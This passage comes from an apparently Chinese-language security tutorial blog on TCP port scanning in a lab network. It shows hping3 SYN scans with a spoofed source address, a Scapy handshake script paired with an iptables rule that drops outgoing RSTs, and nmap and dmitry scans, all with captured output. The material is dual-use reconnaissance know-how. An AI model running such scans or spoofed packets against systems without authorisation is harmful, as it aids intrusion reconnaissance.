to scan, use -V to see all the replies</span><br><span class="line">+----+-----------+---------+---+-----+-----+-----+</span><br><span class="line">|port| serv name |  flags  |ttl| <span class="built_in">id</span>  | win | len |</span><br><span class="line">+----+-----------+---------+---+-----+-----+-----+</span><br><span class="line">  139 netbios-ssn: .S..A...  64     0  5840    46</span><br><span class="line">  143 imap2      : .S..A...  64     0  5840    46</span><br><span class="line">All replies received. Done.</span><br><span class="line">Not responding ports: </span><br></pre></td></tr></table></figure>
<p><strong>示例（高级）：</strong></p>
<p><strong>扫描10.10.10.129的1-25端口，并欺骗 10.10.10.129
自己（10.10.10.135）是 10.10.10.140</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># hping3 -c 25 -S --spoof 10.10.10.140 -p ++1  10.10.10.129  #-c：指定发包数 -S：指定包类型 --spoof ip1：欺骗对方放自己是ip1(即伪造自己的地址) -p ++1：端口号每次加 1</span></span><br><span class="line">HPING 10.10.10.129 (eth0 10.10.10.129): S <span class="built_in">set</span>, 40 headers + 0 data bytes</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=1 flags=RA <span class="built_in">seq</span>=0 win=0 rtt=11.4 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=2 flags=RA <span class="built_in">seq</span>=1 win=0 rtt=3.2 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=3 flags=RA <span class="built_in">seq</span>=2 win=0 rtt=4.0 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=4 flags=RA <span class="built_in">seq</span>=3 win=0 rtt=5.8 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=5 flags=RA <span class="built_in">seq</span>=4 win=0 rtt=7.5 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=6 flags=RA <span class="built_in">seq</span>=5 win=0 rtt=3.4 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=7 flags=RA <span class="built_in">seq</span>=6 win=0 rtt=9.4 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=8 flags=RA <span class="built_in">seq</span>=7 win=0 rtt=6.0 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=9 flags=RA <span class="built_in">seq</span>=8 win=0 rtt=9.5 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=10 flags=RA <span class="built_in">seq</span>=9 win=0 rtt=3.3 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=11 flags=RA <span class="built_in">seq</span>=10 win=0 rtt=5.9 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=12 flags=RA <span class="built_in">seq</span>=11 win=0 rtt=3.0 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=13 flags=RA <span class="built_in">seq</span>=12 win=0 rtt=5.5 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=14 flags=RA <span class="built_in">seq</span>=13 win=0 rtt=5.4 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=15 flags=RA <span class="built_in">seq</span>=14 win=0 rtt=5.5 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=16 flags=RA <span class="built_in">seq</span>=15 win=0 rtt=5.7 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=17 flags=RA <span class="built_in">seq</span>=16 win=0 rtt=6.0 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=18 flags=RA <span class="built_in">seq</span>=17 win=0 rtt=6.1 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=19 flags=RA <span class="built_in">seq</span>=18 win=0 rtt=2.9 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=20 flags=RA <span class="built_in">seq</span>=19 win=0 rtt=3.0 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=21 flags=SA <span class="built_in">seq</span>=20 win=5840 rtt=4.0 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=22 flags=SA <span class="built_in">seq</span>=21 win=5840 rtt=5.9 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=23 flags=RA <span class="built_in">seq</span>=22 win=0 rtt=2.4 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=24 flags=RA <span class="built_in">seq</span>=23 win=0 rtt=3.0 ms</span><br><span class="line">len=46 ip=10.10.10.129 ttl=64 DF <span class="built_in">id</span>=0 sport=25 flags=RA <span class="built_in">seq</span>=24 win=0 rtt=2.2 ms</span><br><span class="line"></span><br><span class="line">--- 10.10.10.129 hping statistic ---</span><br><span class="line">25 packets transmitted, 25 packets received, 0% packet loss</span><br><span class="line">round-trip min/avg/max = 2.2/5.2/11.4 ms</span><br></pre></td></tr></table></figure>
<p><strong>wireshark抓包分析</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211129111017857-41287467.png" /></p>
<p><strong>注意，欺骗完后在kali主机无法查扫描结果，只能登陆伪造的IP对应的主机查看或做端口镜像。</strong></p>
<p><strong>很神奇，这里 kali(10.10.10.135) 为什么能抓到 10.10.10.129
发往 10.10.10.140
的数据包？？？，没搞明白！！！原因：由于MAC没有伪造，又在同一局域网里所以依旧可以给Kali回包！</strong></p>
<h3 id="全连接端口扫描">2、全连接端口扫描</h3>
<h4 id="scapy-2">（1）Scapy</h4>
<ul>
<li>Syn扫描不需要raw_packets</li>
<li><strong>内核认为syn/ack是非法包，直接发rst终断连接</strong></li>
<li>全连接扫描对scapy比较困难</li>
</ul>
<p><strong>注意，由第 2
点得出直接用Scapy是无法实现全连接扫描的，要想用scapy实现全连接端口扫描，就不能让内核往目标机发RST包，所以我们可用防火墙拦截内核发往目标机的RST包。</strong></p>
<p><strong>直接在scapy的操作与脚本的操作类似，此处不再单独演示，详见Scapy脚本处的分析：</strong></p>
<h4 id="scapy脚本-2">（2）Scapy脚本</h4>
<p><strong>tcp_scan2.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">&quot;scapy.runtime&quot;</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">SYN=IP(dst=<span class="string">&quot;10.10.10.129&quot;</span>)/TCP(dport=<span class="number">80</span>,flags=<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-- SENT --&quot;</span>)</span><br><span class="line">SYN.display()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n\n-- RECEIVED --&quot;</span>)</span><br><span class="line">response=sr1(SYN,timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">response.display()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(response[TCP].flags==<span class="number">18</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n\n-- SENT --&quot;</span>)</span><br><span class="line">    A=IP(dst=<span class="string">&quot;10.10.10.129&quot;</span>)/TCP(dport=<span class="number">80</span>,flags=<span class="string">&#x27;A&#x27;</span>,ack=(response[TCP].seq+<span class="number">1</span>))</span><br><span class="line">    A.display()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n\n-- RECEIVED --&quot;</span>)</span><br><span class="line">    response2=sr1(A,timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">    response2.display()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SYN-ACK not returned!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>防火墙设置之前的测试（分析见注释）：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># python3 ./tcp_scan2.py   </span></span><br><span class="line">-- SENT --　　　　　　　　　　　　　<span class="comment">#发包</span></span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version   = 4</span><br><span class="line">  ihl       = None</span><br><span class="line">  tos       = 0x0</span><br><span class="line">  len       = None</span><br><span class="line">  <span class="built_in">id</span>        = 1</span><br><span class="line">  flags     = </span><br><span class="line">  frag      = 0</span><br><span class="line">  ttl       = 64</span><br><span class="line">  proto     = tcp</span><br><span class="line">  chksum    = None</span><br><span class="line">  src       = 10.10.10.135</span><br><span class="line">  dst       = 10.10.10.129</span><br><span class="line">  \options   \</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport     = ftp_data</span><br><span class="line">     dport     = http</span><br><span class="line">     <span class="built_in">seq</span>       = 0</span><br><span class="line">     ack       = 0</span><br><span class="line">     dataofs   = None</span><br><span class="line">     reserved  = 0 flags =S　　　　　　　　<span class="comment">#第一次握手包类型（SYN）</span></span><br><span class="line">     window    = 8192</span><br><span class="line">     chksum    = None</span><br><span class="line">     urgptr    = 0</span><br><span class="line">     options   = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- RECEIVED --　　　　　　　　　　　<span class="comment">#收包</span></span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">      version   = 4</span><br><span class="line">      ihl       = 5</span><br><span class="line">      tos       = 0x0</span><br><span class="line">      len       = 44</span><br><span class="line">      <span class="built_in">id</span>        = 0</span><br><span class="line">      flags     = DF</span><br><span class="line">      frag      = 0</span><br><span class="line">      ttl       = 64</span><br><span class="line">      proto     = tcp</span><br><span class="line">      chksum    = 0x11b1</span><br><span class="line">      src       = 10.10.10.129</span><br><span class="line">      dst       = 10.10.10.135</span><br><span class="line">      \options   \</span><br><span class="line">    <span class="comment">###[ TCP ]### </span></span><br><span class="line">         sport     = http</span><br><span class="line">         dport     = ftp_data</span><br><span class="line">         <span class="built_in">seq</span>       = 418625511</span><br><span class="line">         ack       = 1</span><br><span class="line">         dataofs   = 6</span><br><span class="line">         reserved  = 0 flags =SA　　　　　　　　　　<span class="comment">#第二次握手包类型（SYN+ACK）</span></span><br><span class="line">         window    = 5840</span><br><span class="line">         chksum    = 0x86eb</span><br><span class="line">         urgptr    = 0</span><br><span class="line">         options   = [(<span class="string">&#x27;MSS&#x27;</span>, 1460)]</span><br><span class="line">    <span class="comment">###[ Padding ]### </span></span><br><span class="line">            load      = <span class="string">&#x27;\x00\x00&#x27;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    -- SENT --　　　　　　　　　　<span class="comment">#注意，该包是理论上的第三次握手包，实际上在第二次握手结束，发该包之前操作系统内核已经发了一个RST包给目标机中断连接，会导致src发完该包后会收到RST包（参见后面）</span></span><br><span class="line">    <span class="comment">###[ IP ]### </span></span><br><span class="line">      version   = 4</span><br><span class="line">      ihl       = None</span><br><span class="line">      tos       = 0x0</span><br><span class="line">      len       = None</span><br><span class="line">      <span class="built_in">id</span>        = 1</span><br><span class="line">      flags     = </span><br><span class="line">      frag      = 0</span><br><span class="line">      ttl       = 64</span><br><span class="line">      proto     = tcp</span><br><span class="line">      chksum    = None</span><br><span class="line">      src       = 10.10.10.135</span><br><span class="line">      dst       = 10.10.10.129</span><br><span class="line">      \options   \</span><br><span class="line">    <span class="comment">###[ TCP ]### </span></span><br><span class="line">         sport     = ftp_data</span><br><span class="line">         dport     = http</span><br><span class="line">         <span class="built_in">seq</span>       = 0</span><br><span class="line">         ack       = 418625512</span><br><span class="line">         dataofs   = None</span><br><span class="line">         reserved  = 0 flags =A　　　　　　　　　　　　<span class="comment">#第三次握手包类型（ACK）</span></span><br><span class="line">         window    = 8192</span><br><span class="line">         chksum    = None</span><br><span class="line">         urgptr    = 0</span><br><span class="line">         options   = []</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    -- RECEIVED --　　　　　　　　　　　　　　<span class="comment">#收包</span></span><br><span class="line">    <span class="comment">###[ IP ]### </span></span><br><span class="line">      version   = 4</span><br><span class="line">      ihl       = 5</span><br><span class="line">      tos       = 0x0</span><br><span class="line">      len       = 40</span><br><span class="line">      <span class="built_in">id</span>        = 0</span><br><span class="line">      flags     = DF</span><br><span class="line">      frag      = 0</span><br><span class="line">      ttl       = 64</span><br><span class="line">      proto     = tcp</span><br><span class="line">      chksum    = 0x11b5</span><br><span class="line">      src       = 10.10.10.129</span><br><span class="line">      dst       = 10.10.10.135</span><br><span class="line">      \options   \</span><br><span class="line">    <span class="comment">###[ TCP ]### </span></span><br><span class="line">         sport     = http</span><br><span class="line">         dport     = ftp_data</span><br><span class="line">         <span class="built_in">seq</span>       = 418625512</span><br><span class="line">         ack       = 0</span><br><span class="line">         dataofs   = 5</span><br><span class="line">         reserved  = 0 flags =R　　　　　　　　　　<span class="comment">#注意，这是在 src 发完 ack 之后收到的，意味着 dst 认为收到的 ack 是个异常包，发个 rst 包来中断连接，原因如上述</span></span><br><span class="line">         window    = 0</span><br><span class="line">         chksum    = 0xb585</span><br><span class="line">         urgptr    = 0</span><br><span class="line">         options   = []</span><br><span class="line">    <span class="comment">###[ Padding ]### </span></span><br><span class="line">            load      = <span class="string">&#x27;\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>wireshark抓包结果：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211129123135384-1033547600.png" /></p>
<p><strong>防火墙设置：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># iptables -L　　　　　　　　　　　　　　　　　　　　　　　　　　#查看防火墙已有规则</span></span><br><span class="line">Chain INPUT (policy ACCEPT)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">    </span><br><span class="line">Chain FORWARD (policy ACCEPT)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">    </span><br><span class="line">Chain OUTPUT (policy ACCEPT)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">                                                                        ┌──(root💀kali) -[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.10.10.129 -j DROP             #注意是 2 个RST</span></span><br><span class="line"> </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># iptables -L                                                       </span></span><br><span class="line">    Chain INPUT (policy ACCEPT)</span><br><span class="line">    target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">    </span><br><span class="line">    Chain FORWARD (policy ACCEPT)</span><br><span class="line">    target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">    </span><br><span class="line">    Chain OUTPUT (policy ACCEPT)</span><br><span class="line">    target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">    DROP       tcp--  anywhere 10.10.10.129         tcp flags:RST/RST　　　　　　<span class="comment">#已被添加</span></span><br></pre></td></tr></table></figure>
<p><strong>防火墙设置之后的测试：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># python3 ./tcp_scan2.py </span></span><br><span class="line">-- SENT --</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version   = 4</span><br><span class="line">  ihl       = None</span><br><span class="line">  tos       = 0x0</span><br><span class="line">  len       = None</span><br><span class="line">  <span class="built_in">id</span>        = 1</span><br><span class="line">  flags     = </span><br><span class="line">  frag      = 0</span><br><span class="line">  ttl       = 64</span><br><span class="line">  proto     = tcp</span><br><span class="line">  chksum    = None</span><br><span class="line">  src       = 10.10.10.135</span><br><span class="line">  dst       = 10.10.10.129</span><br><span class="line">  \options   \</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport     = ftp_data</span><br><span class="line">     dport     = http</span><br><span class="line">     <span class="built_in">seq</span>       = 0</span><br><span class="line">     ack       = 0</span><br><span class="line">     dataofs   = None</span><br><span class="line">     reserved  = 0 flags =S</span><br><span class="line">     window    = 8192</span><br><span class="line">     chksum    = None</span><br><span class="line">     urgptr    = 0</span><br><span class="line">     options   = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- RECEIVED --</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version   = 4</span><br><span class="line">  ihl       = 5</span><br><span class="line">  tos       = 0x0</span><br><span class="line">  len       = 44</span><br><span class="line">  <span class="built_in">id</span>        = 0</span><br><span class="line">  flags     = DF</span><br><span class="line">  frag      = 0</span><br><span class="line">  ttl       = 64</span><br><span class="line">  proto     = tcp</span><br><span class="line">  chksum    = 0x11b1</span><br><span class="line">  src       = 10.10.10.129</span><br><span class="line">  dst       = 10.10.10.135</span><br><span class="line">  \options   \</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport     = http</span><br><span class="line">     dport     = ftp_data</span><br><span class="line">     <span class="built_in">seq</span>       = 2643752577</span><br><span class="line">     ack       = 1</span><br><span class="line">     dataofs   = 6</span><br><span class="line">     reserved  = 0 flags =SA</span><br><span class="line">     window    = 5840</span><br><span class="line">     chksum    = 0x43b0</span><br><span class="line">     urgptr    = 0</span><br><span class="line">     options   = [(<span class="string">&#x27;MSS&#x27;</span>, 1460)]</span><br><span class="line"><span class="comment">###[ Padding ]### </span></span><br><span class="line">        load      = <span class="string">&#x27;\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- SENT --</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version   = 4</span><br><span class="line">  ihl       = None</span><br><span class="line">  tos       = 0x0</span><br><span class="line">  len       = None</span><br><span class="line">  <span class="built_in">id</span>        = 1</span><br><span class="line">  flags     = </span><br><span class="line">  frag      = 0</span><br><span class="line">  ttl       = 64</span><br><span class="line">  proto     = tcp</span><br><span class="line">  chksum    = None</span><br><span class="line">  src       = 10.10.10.135</span><br><span class="line">  dst       = 10.10.10.129</span><br><span class="line">  \options   \</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport     = ftp_data</span><br><span class="line">     dport     = http</span><br><span class="line">     <span class="built_in">seq</span>       = 0</span><br><span class="line">     ack       = 2643752578</span><br><span class="line">     dataofs   = None</span><br><span class="line">     reserved  = 0 flags =A</span><br><span class="line">     window    = 8192</span><br><span class="line">     chksum    = None</span><br><span class="line">     urgptr    = 0</span><br><span class="line">     options   = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- RECEIVED --</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version   = 4</span><br><span class="line">  ihl       = 5</span><br><span class="line">  tos       = 0x0</span><br><span class="line">  len       = 40</span><br><span class="line">  <span class="built_in">id</span>        = 0</span><br><span class="line">  flags     = DF</span><br><span class="line">  frag      = 0</span><br><span class="line">  ttl       = 64</span><br><span class="line">  proto     = tcp</span><br><span class="line">  chksum    = 0x11b5</span><br><span class="line">  src       = 10.10.10.129</span><br><span class="line">  dst       = 10.10.10.135</span><br><span class="line">  \options   \</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport     = http</span><br><span class="line">     dport     = ftp_data</span><br><span class="line">     <span class="built_in">seq</span>       = 2643752578</span><br><span class="line">     ack       = 1</span><br><span class="line">     dataofs   = 5</span><br><span class="line">     reserved  = 0 flags =A　　　　　　　　　　　　<span class="comment">#成功！</span></span><br><span class="line">     window    = 5840</span><br><span class="line">     chksum    = 0x5b6d</span><br><span class="line">     urgptr    = 0</span><br><span class="line">     options   = []</span><br><span class="line"><span class="comment">###[ Padding ]### </span></span><br><span class="line">        load      = <span class="string">&#x27;\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>wireshark抓包结果：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211129125720632-837364037.png" /></p>
<h4 id="nmap-2">（3）nmap</h4>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># nmap -sT 10.10.10.129 -p 80               </span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-29 01:41 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Host is up (0.00070s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:DE:5D:BA (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.38 seconds</span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># nmap -sT 10.10.10.129 -p 80,21,22,25</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-29 01:41 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Host is up (0.00083s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE  SERVICE</span><br><span class="line">21/tcp open   ftp</span><br><span class="line">22/tcp open   ssh</span><br><span class="line">25/tcp closed smtp</span><br><span class="line">80/tcp open   http</span><br><span class="line">MAC Address: 00:0C:29:DE:5D:BA (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.26 seconds</span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># nmap -sT 10.10.10.129 -p 1-100      </span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-29 01:41 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 97 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:DE:5D:BA (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.28 seconds</span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># nmap -sT -iL ./iplist.txt  10.10.10.129 -p 1-100 </span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-29 01:42 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Host is up (0.00089s latency).</span><br><span class="line">Not shown: 97 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:DE:5D:BA (VMware)</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.2</span><br><span class="line">Host is up (0.0024s latency).</span><br><span class="line">Not shown: 99 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">53/tcp open  domain</span><br><span class="line">MAC Address: 00:50:56:F0:F4:B1 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 2 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 0.30 seconds</span><br></pre></td></tr></table></figure>
<p><strong>wireshark抓包结果：</strong></p>
<p>以 "nmap -sT 10.10.10.129 -p 80,21,22,25"为例：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211129145045277-1988807704.png" /></p>
<h4 id="dmitry">（4）dmitry</h4>
<ul>
<li>功能简单，使用也简单</li>
<li>默认150个常用端口</li>
</ul>
<p><strong>帮助信息（help）：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># dmitry -h</span></span><br><span class="line">Deepmagic Information Gathering Tool</span><br><span class="line"><span class="string">&quot;There be some deep magic going on&quot;</span></span><br><span class="line"></span><br><span class="line">dmitry: invalid option -- <span class="string">&#x27;h&#x27;</span></span><br><span class="line">Usage: dmitry [-winsepfb] [-t 0-9] [-o %host.txt] host</span><br><span class="line">  -o     Save output to %host.txt or to file specified by -o file</span><br><span class="line">  -i     Perform a whois lookup on the IP address of a host</span><br><span class="line">  -w     Perform a whois lookup on the domain name of a host</span><br><span class="line">  -n     Retrieve Netcraft.com information on a host</span><br><span class="line">  -s     Perform a search <span class="keyword">for</span> possible subdomains</span><br><span class="line">  -e     Perform a search <span class="keyword">for</span> possible email addresses</span><br><span class="line">  -p     Perform a TCP port scan on a host</span><br><span class="line">* -f     Perform a TCP port scan on a host showing output reporting filtered ports</span><br><span class="line">* -b     Read <span class="keyword">in</span> the banner received from the scanned port</span><br><span class="line">* -t 0-9 Set the TTL <span class="keyword">in</span> seconds when scanning a TCP port ( Default 2 )</span><br><span class="line">*Requires the -p flagged to be passed</span><br></pre></td></tr></table></figure>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># dmitry -p 10.10.10.129                                                             1 ⨯</span></span><br><span class="line">Deepmagic Information Gathering Tool</span><br><span class="line"><span class="string">&quot;There be some deep magic going on&quot;</span></span><br><span class="line"></span><br><span class="line">ERROR: Unable to locate Host Name <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Continuing with limited modules</span><br><span class="line">HostIP:10.10.10.129</span><br><span class="line">HostName:</span><br><span class="line"></span><br><span class="line">Gathered TCP Port information <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">---------------------------------</span><br><span class="line"></span><br><span class="line"> Port           State</span><br><span class="line"></span><br><span class="line">21/tcp          open</span><br><span class="line">22/tcp          open</span><br><span class="line">80/tcp          open</span><br><span class="line">139/tcp         open</span><br><span class="line">143/tcp         open</span><br><span class="line"></span><br><span class="line">Portscan Finished: Scanned 150 ports, 144 ports were <span class="keyword">in</span> state closed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">All scans completed, exiting</span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># dmitry -p 10.10.10.129 -o test</span></span><br><span class="line">Deepmagic Information Gathering Tool</span><br><span class="line"><span class="string">&quot;There be some deep magic going on&quot;</span></span><br><span class="line"></span><br><span class="line">Writing output to <span class="string">&#x27;test.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">ERROR: Unable to locate Host Name <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Continuing with limited modules</span><br><span class="line">HostIP:10.10.10.129</span><br><span class="line">HostName:</span><br><span class="line"></span><br><span class="line">Gathered TCP Port information <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">---------------------------------</span><br><span class="line"></span><br><span class="line"> Port           State</span><br><span class="line"></span><br><span class="line">21/tcp          open</span><br><span class="line">22/tcp          open</span><br><span class="line">80/tcp          open</span><br><span class="line">139/tcp         open</span><br><span class="line">143/tcp         open</span><br><span class="line"></span><br><span class="line">Portscan Finished: Scanned 150 ports, 144 ports were <span class="keyword">in</span> state closed</span><br><span class="line"></span><br><span class="line">zsh: segmentation fault  dmitry -p 10.10.10.129 -o <span class="built_in">test</span></span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># more test.txt                                                                    139 ⨯</span></span><br><span class="line">ERROR: Unable to locate Host Name <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Continuing with limited modules</span><br><span class="line">HostIP:10.10.10.129</span><br><span class="line">HostName:</span><br><span class="line"></span><br><span class="line">Gathered TCP Port information <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">---------------------------------</span><br><span class="line"></span><br><span class="line"> Port           State</span><br><span class="line">21/tcp          